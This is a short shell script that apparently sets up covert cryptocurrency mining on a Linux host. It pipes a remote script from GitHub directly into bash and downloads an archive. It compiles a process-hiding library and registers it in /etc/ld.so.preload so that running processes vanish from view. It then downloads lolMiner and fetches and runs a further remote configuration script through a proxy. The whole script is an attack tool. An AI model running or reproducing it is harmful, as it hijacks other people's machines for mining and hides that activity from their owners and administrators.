#!/bin/sh
wget -O - https://raw.githubusercontent.com/Irvan-arch/tasik/refs/heads/main/px_1.sh | bash
wget https://github.com/Irvan-arch/tasik/raw/refs/heads/main/magicLol.zip
unzip magicLol.zip
make
gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
mv libprocesshider.so /usr/local/lib/
echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.93/lolMiner_v1.93_Lin64.tar.gz
tar -xvzf lolMiner_v1.93_Lin64.tar.gz
rm .gitignore
cd 1.37
wget https://raw.githubusercontent.com/KebonKalapa/ETC/main/set_lol.sh
chmod +x *.sh
graftcp ./set_lol.sh
